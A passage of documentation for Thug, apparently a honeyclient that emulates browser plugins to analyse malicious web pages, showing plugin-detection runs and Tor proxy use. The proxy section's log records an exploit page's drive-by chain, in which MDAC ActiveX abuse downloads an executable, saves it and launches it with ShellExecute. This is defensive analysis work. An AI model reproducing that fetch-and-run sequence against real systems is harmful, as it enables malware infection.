<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_33
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> ActiveXObject: javaplugin.160_32
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: AdobeReader version: <span class="m">9</span>,1,0,0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Flash version: <span class="m">10</span>,0,64,0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Java version: <span class="m">1</span>,6,0,32
</pre></div>
</div>
<p>Let’s try with different Adobe Acrobat Reader and Shockwave Flash versions now.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src ~ $ thug -l -A <span class="m">8</span>.1.0 -S <span class="m">10</span>.3.1.180 ../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_40
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_39
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_38
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_37
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_36
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_35
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_34
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_33
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> ActiveXObject: javaplugin.160_32
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: AdobeReader version: <span class="m">8</span>,1,0,0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Flash version: <span class="m">10</span>,3,1,180
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:58<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Java version: <span class="m">1</span>,6,0,32
</pre></div>
</div>
</div>
<div class="section" id="javaplugin-and-javawebstart">
<h2>JavaPlugin and JavaWebStart<a class="headerlink" href="#javaplugin-and-javawebstart" title="Permalink to this headline">¶</a></h2>
<p>Taking a look at the available options you can see the -J (–javaplugin) option which is quite
useful for getting different Java exploits which target different versions of Java. Let’s take
a look at what happens if we locally analyze PluginDetect (see Local Analysis later for details).</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src ~ $ thug -l ../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_40
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_39
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_38
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_37
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_36
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_35
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_34
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_33
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> ActiveXObject: javaplugin.160_32
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: AdobeReader version: <span class="m">9</span>,1,0,0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Flash version: <span class="m">10</span>,0,64,0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Java version: <span class="m">1</span>,6,0,32
</pre></div>
</div>
<p>Let’s try with a different JavaPlugin version now.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src ~ $ thug -l -J <span class="m">1</span>.7.0.7 ../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:55<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.7.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_40
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_39
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_38
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_37
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_36
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_35
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_34
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_33
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_32
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_31
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_30
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_29
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_28
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_27
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_26
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_25
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_24
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_23
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_22
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_21
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_20
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_19
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_18
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_17
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_16
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_15
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_14
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_13
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_12
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_11
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_10
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_09
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_08
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> ActiveXObject: javaplugin.170_07
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.7.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: AdobeReader version: <span class="m">9</span>,1,0,0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Flash version: <span class="m">10</span>,0,64,0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:40:56<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Java version: <span class="m">1</span>,7,0,7
</pre></div>
</div>
</div>
<div class="section" id="proxy-support">
<h2>Proxy support<a class="headerlink" href="#proxy-support" title="Permalink to this headline">¶</a></h2>
<p>Another really useful option is <em>-p (–proxy)</em> which allows to specify a proxy. Currently Thug
supports HTTP, SOCKS4 and SOCKS5 proxy using the following format</p>
<blockquote>
<div><p>scheme://[username:password&#64;]host:port
(supported schemes: http, socks4, socks5)</p>
</div></blockquote>
<p>This option allows Thug to make use of Tor in order to anonymize the access to a malicious
page. The trick is quite simple and requires a Tor instance up and running. Simply run Thug
using <em>socks5://127.0.0.1:9050</em> as proxy and your real IP address will not be revealed.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~ $ thug -p socks5://127.0.0.1:9050 <span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:14<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07 <span class="o">(</span>Status: <span class="m">200</span>, Referrer: None<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:14<span class="o">]</span> &lt;applet <span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span> <span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:14<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> Ryp.jar --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:16<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:17<span class="o">]</span> Saving applet Ryp.jar
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:17<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:17<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:18<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:18<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:18<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:18<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:18<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:18<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:18<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>adodb.stream<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:18<span class="o">]</span> ActiveXObject: adodb.stream
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:18<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>Shell.Application<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:18<span class="o">]</span> ActiveXObject: shell.application
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:18<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>msxml2.XMLHTTP<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:18<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:18<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Fetching from URL http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:22<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span> <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:23<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Saving File: d328b5a123bce1c0d20d763ad745303a
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:23<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> send
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:23<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> open
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:23<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Write
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:23<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> SaveToFile <span class="o">(</span>.//..//e9a458c.exe<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:23<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Close
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:23<span class="o">]</span> <span class="o">[</span>Shell.Application ActiveX<span class="o">]</span> ShellExecute command: .//..//e9a458c.exe
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:23<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> ./data/ap1.php?f<span class="o">=</span>b081d --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d
